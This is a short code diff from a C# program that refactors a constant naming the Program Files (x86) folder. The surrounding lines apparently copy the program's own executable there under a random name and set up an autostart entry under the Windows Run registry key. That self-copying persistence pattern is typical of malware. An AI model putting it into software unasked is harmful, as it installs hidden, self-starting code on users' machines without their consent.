@@ -13,6 +13,7 @@ namespace Type
         private const char QUOT = '\"';
         private const string RUN = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
         private const string RUN_NAME = "type-bin";
+        private const Environment.SpecialFolder EMBED_LOC = Environment.SpecialFolder.ProgramFilesX86;
 
         private static string RandomName()
         {
@@ -69,7 +70,7 @@ namespace Type
             string me = System.Reflection.Assembly.GetExecutingAssembly().Location;
             FileInfo applicationInfo = new FileInfo(me);
 
-            string dest = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
+            string dest = Environment.GetFolderPath(EMBED_LOC);
             string name = RandomName();
             string target = (dest + name);
 
